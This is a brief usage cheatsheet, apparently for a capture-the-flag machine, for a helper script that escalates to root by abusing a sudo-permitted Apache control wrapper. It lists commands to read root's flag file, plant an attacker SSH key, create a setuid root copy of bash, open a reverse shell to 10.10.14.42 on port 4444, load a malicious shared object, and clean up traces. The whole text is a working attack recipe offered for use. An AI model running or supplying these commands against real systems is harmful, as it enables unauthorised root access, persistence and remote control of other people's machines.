🎯 Usage Cheatsheet ..  (.. beta ..) 

Read a file (e.g. root flag):

./apache-privesc-helper.sh read /root/root.txt
sudo /usr/local/bin/safeapache2ctl -f /tmp/apache_privesc/payload.conf configtest


Write key:

./apache-privesc-helper.sh key "ssh-ed25519 AAAAC3Nz... attacker@kali"


Run arbitrary command:

./apache-privesc-helper.sh cmd "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
/tmp/rootbash -p


Spawn reverse shell:

./apache-privesc-helper.sh rev 10.10.14.42 4444
sudo /usr/local/bin/safeapache2ctl -f /tmp/apache_privesc/payload.conf start


Load malicious .so:

./apache-privesc-helper.sh so


Cleanup:

./apache-privesc-helper.sh clean

